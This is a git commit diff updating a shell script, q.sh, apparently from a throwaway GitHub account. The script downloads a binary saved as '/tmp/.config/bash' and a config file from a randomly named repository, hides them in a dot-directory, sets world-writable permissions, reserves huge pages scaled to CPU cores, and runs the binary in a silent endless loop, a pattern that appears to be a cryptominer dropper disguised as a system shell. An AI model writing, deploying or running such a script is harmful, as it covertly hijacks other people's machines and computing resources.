ead18241792a1dd7428206835164981ff7fdff9f
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-01 16:02:28 +0800

    Update q.sh

--- q.sh
+++ q.sh
@@ -1,16 +1,19 @@
 #!/bin/bash
 
+sudo apt -qqy update || apt -qqy update
+sudo apt -qqy install wget icu-devtools || apt -qqy install wget icu-devtools
+
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] || cores=1
+name="Cli_${cores}.sh"
+
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
-sysctl -w vm.nr_hugepages=32768 || sudo sysctl -w vm.nr_hugepages=32768
+sudo sysctl -w vm.nr_hugepages=$((cores*96)) || sysctl -w vm.nr_hugepages=$((cores*96))
 
 mkdir -p "/tmp/.config"
 wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
 wget -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
-
-cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
-[ -n "$cores" ] || cores=1
-name="Cli_${cores}.sh"
 
 while true; do cd /tmp/.config; ./bash "${name}" "${cores}" >/dev/null 2>&1 ; done
 
